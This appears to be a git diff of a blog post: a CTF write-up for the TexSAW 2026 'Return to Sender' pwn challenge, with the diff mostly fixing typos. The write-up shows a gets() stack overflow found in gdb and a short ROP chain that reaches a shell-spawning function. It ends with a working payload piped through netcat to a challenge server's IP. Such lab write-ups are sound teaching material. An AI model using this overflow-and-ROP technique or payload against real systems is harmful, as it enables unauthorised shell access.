@@ -1,9 +1,9 @@
 ---
 layout: post
-title: TexSAW 2026 - Return to Sender
+title: TexSAW 2026 - Return to Sender (PWN)
 date: 2026-03-30
 description: Privilege escalation and skip of a security test
-tags: writeups pwn texsaw ROP
+tags: writeups pwn texsawctf ROP
 categories: writeups pwn
 author: "Guillaume"
 ---
@@ -18,19 +18,19 @@ author: "Guillaume"
 
 ## Initial Analysis
 
-I started by importing the binary file into Ghidra where is was able to identify 6 functions :
+I started by importing the binary file into Ghidra where I was able to identify 6 functions :
 
 - `avenue`, `boulevard` and `court` : those only print a string.
 - `deliver` : uses `gets` to get an input and uses that input to launch one of the previous functions or none of them if the input isn't correct -> possible overflow.
-- `drive` : a function opening a shell if the parameter contains the right value. However this function is never called, so calling it is my first goal.
-- `main` : clears IO buffers then lauches `deliver`.
+- `drive` : a function opening a shell if the parameter contains the right value. However, this function is never called, so calling it is my first goal.
+- `main` : clears IO buffers then launches `deliver`.
 - `tool` : does apparently nothing.
 
 # Solution Path
 
 ## Step 1: Getting into the `drive` function
 
-Since I know that I can overflow with the input in `deliver` I launched gdb to view the state of the stack after entering the input to see what I could overide.
+Since I know that I can overflow with the input in `deliver`, I launched gdb to view the state of the stack after entering the input to see what I could override.
 
 ```bash
 (gdb) x/16x $sp
@@ -40,7 +40,7 @@ Since I know that I can overflow with the input in `deliver` I launched gdb to v
 0x7fffffffe110:	0xffffe258	0x00007fff	0x00000000	0x00000001
 ```
 
-Here we can see the only `a` I inputed at the first byte after the stack pointer and 40 bytes after the stack pointer there is `0x004013c0`, this is the return address, so by changing it to the address of `drive` (`0x401211`) I should be able to access it.
+Here we can see the only `a` I inputted at the first byte after the stack pointer and 40 bytes after the stack pointer there is `0x004013c0`, this is the return address, so by changing it to the address of `drive` (`0x401211`) I should be able to access it.
 I tried this hypothesis directly in gdb :
 
 ```
@@ -54,7 +54,7 @@ Sorry, we couldn't deliver your package. Returning to sender...
 (gdb)
 ```
 
-So this works very well but now I need to call the funtion with the right parameter to go into this `if` :
+So this works very well, but now I need to call the function with the right parameter to go into this `if` :
 
 ```C
 if (param_1 == 0x48435344) {
@@ -77,7 +77,7 @@ RET
 
 So now I need to call this function with `0x48435344` at the top of the stack after the call and override the return address once more to get into `drive`.
 
-To keep track of the stack I inputed `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN` to fill up the first 40 bytes after the stack pointer, changed the address at `$sp + 40` to the address of `tool` (`0x4011b6`) and then printed the registers just after exiting `tool` :
+To keep track of the stack, I inputted `abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN` to fill up the first 40 bytes after the stack pointer, changed the address at `$sp + 40` to the address of `tool` (`0x4011b6`) and then printed the registers just after exiting `tool` :
 
 ```
 0x00000000004012a2 in deliver ()
@@ -105,9 +105,9 @@ which has no line number information.
 rdi            0x4e4d4c4b4a494847  5642249794417674311
 ```
 
-So after `tool` we are now in `0x00007fffffffe258` which correspond the the 8 bytes starting at `$sp + 48` in `deliver` and rdi is containing `0x4e4d4c4b4a494847` which correspond to the 8 bytes starting at `$sp + 32`.
+So after `tool`, we are now in `0x00007fffffffe258` which correspond the 8 bytes starting at `$sp + 48` in `deliver` and rdi is containing `0x4e4d4c4b4a494847` which correspond to the 8 bytes starting at `$sp + 32`.
 
-I can now quickly verify in gdb this offsets are the correct ones :
+I can now quickly verify in gdb these offsets are the correct ones :
 
 ```
 0x00000000004012a7 in deliver ()
@@ -146,7 +146,7 @@ This indeed allows us to get into the `if` and to get a shell.
 
 # Exploit
 
-I only need to craft a payload and to pipe it to netcat to get the flag.
+I only need to craft a payload and pipe it to netcat to get the flag.
 
 I started with this payload (with some addresses written in reverse because the CPU is in little endian) :
 
@@ -173,7 +173,7 @@ pwd
 ^C
 ```
 
-It was kind of sucessful but the shell wasn't registering my inputs so I added them directly into the payload :
+It was kind of successful but the shell wasn't registering my inputs, so I added them directly into the payload :
 
 ```bash
 print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x53\x43\x48\x00\x00\x00\x00\xb6\x11\x40\x00\x00\x00\x00\x00\x11\x12\x40\x00\x00\x00\x00\x00\nls\n" | nc 143.198.163.4 15858
